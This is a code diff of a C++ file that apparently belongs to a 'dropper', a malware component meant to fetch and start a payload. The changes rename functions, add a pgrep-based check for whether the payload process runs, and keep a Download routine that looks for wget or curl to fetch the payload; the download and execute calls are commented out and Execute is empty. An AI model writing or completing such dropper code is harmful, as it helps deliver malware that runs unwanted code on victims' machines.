@@ -1,17 +1,20 @@
 #include "dropper.h"
+#define die(e) do { fprintf(stderr, "%s\n", e); exit(EXIT_FAILURE); } while (0);
 
-int pull()
+int Pull()
 {
 	fprintf(stdout, "[Dropper called]");
 
-	bool payloadExists = fileExists(_PayloadLocal);
+	bool payloadExists = FileExists(_PayloadLocal);
 
 	//fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);
 
 	//if(!payloadExists)
 	//  	download();
 
-	payloadRunning();
+	//payloadRunning();
+	//
+	ProcessRunning();
 	//fputs(payloadRunning() ? "\nIs running" : "\nIsn't running", stdout);
 
 	//execute();
@@ -20,13 +23,47 @@ int pull()
 }
 
 //NOTE Only checks for accessibility, not existance.
-bool fileExists(std::string name)
+bool FileExists(std::string name)
 {
 	struct stat buffer;
 	return (stat (name.c_str(), &buffer) == 0);
 }
 
-bool payloadRunning()
+bool ProcessRunning()
+{
+	int result;
+	int link[2];
+	pid_t pid;
+	char foo[4096];
+
+	if(pipe(link) == -1)
+		die("pipe");
+
+	if((pid = fork()) == -1)
+		die("fork");
+
+	if(pid == 0)
+	{
+		dup2(link[1], STDOUT_FILENO);
+		close(link[0]);
+		close(link[1]);
+
+		char* argv[] = { (char*)"pgrep", (char*)_ProcName.c_str(), (char*)0};
+		execve("/usr/bin/pgrep", argv, NULL);
+		die("execve");
+	}
+	else
+	{
+		close(link[1]);
+		result = read(link[0], foo, sizeof(foo));
+		printf("\nPID: %.*s\n", result, foo);
+	}
+
+	return (result == 0);
+}
+
+
+void WriteToFile()
 {
 	// Save PID to file.
 	if(fork() == 0)
@@ -43,25 +80,22 @@ bool payloadRunning()
 		char* argv[] = { (char*)"pgrep", (char*)_ProcName.c_str(), (char*)0};
 		execve("/usr/bin/pgrep", argv, NULL);
 	}
-
-
-	std::cout << "\n==========================" << std::endl;
-
-	return false;
 }
 
-void download()
+void Download()
 {
+	// Webclients path
 	std::vector<const char*> webclients = 
 	{
-			"/usr/bin/wget",
-		   	"/usr/bin/curl"
+		"/usr/bin/wget",
+		"/usr/bin/curl"
 	};
 
 
+	// Try to download using an existing webclient
 	for(size_t i = 0; i < webclients.size(); i++)
 	{
-		if(fileExists(webclients[i]))
+		if(FileExists(webclients[i]))
 		{
 				std::cout << "Found webclient: " << webclients[i] << std::endl;
 				
@@ -80,7 +114,7 @@ void download()
 	}
 }
 
-void execute()
+void Execute()
 {
 
 }
